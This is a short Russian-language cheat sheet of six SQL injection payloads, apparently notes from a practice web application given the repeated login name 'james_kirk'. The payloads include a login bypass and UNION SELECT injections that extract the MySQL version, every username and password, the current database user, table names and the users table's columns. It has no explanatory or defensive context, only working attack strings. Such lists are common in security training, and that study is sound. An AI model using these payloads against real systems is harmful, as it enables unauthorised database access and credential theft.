## Список SQL-инъекций

### 1. Список всех пользователей  
**Инъекция:** `' OR 1=1 #`  

### 2. Узнать версию MySQL  
**Инъекция:** `' UNION SELECT @@version, @@version #`  
*(ввод в поле пароля, пользователь — `james_kirk`)*  

### 3. Узнать пароли всех пользователей  
**Инъекция:** `' UNION SELECT username, password FROM users;`  

### 4. Определить текущего пользователя базы данных  
**Инъекция:** `' UNION SELECT CURRENT_USER(), CURRENT_USER() #`  
*(ввод в поле пароля, пользователь — `james_kirk`)*  

### 5. Извлечь имена таблиц из схемы базы данных  
**Инъекция:** `' UNION SELECT table_name, table_name FROM information_schema.tables #`  
*(ввод в поле пароля, пользователь — `james_kirk`)*  

### 6. Получить список столбцов таблицы `users`  
**Инъекция:** `' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name = 'users' #`  
*(ввод в поле пароля, пользователь — `james_kirk`)*
